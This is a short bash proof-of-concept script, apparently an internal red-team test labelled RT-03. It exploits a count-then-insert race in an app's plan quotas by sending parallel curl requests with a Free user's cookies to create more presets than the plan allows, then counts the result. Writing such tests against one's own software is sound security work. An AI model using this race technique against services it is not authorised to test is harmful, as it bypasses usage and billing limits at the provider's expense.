#!/usr/bin/env bash
# RT-03: plan quotas are count-then-insert (lib/repo/server.ts insertRow), so parallel inserts all pass the count.
# Usage: ops/redteam/quota_race.sh http://localhost:3410 <free-user cookie jar> [n]
B=$1 JAR=$2 N=${3:-20}
for i in $(seq 1 "$N"); do
  curl -s -o /dev/null -w '%{http_code}\n' -b "$JAR" -H "Origin: $B" -H 'content-type: application/json' \
    -d "{\"name\":\"race $i\",\"emoji\":null,\"query\":{},\"columns\":null,\"sort\":null,\"is_default\":false,\"position\":$i}" \
    "$B/api/data/presets" &
done | sort | uniq -c
wait
echo "presets stored for this Free account (plan allows 1):"
curl -s -b "$JAR" "$B/api/data" | python3 -c 'import json,sys;print(len(json.load(sys.stdin)["presets"]))'
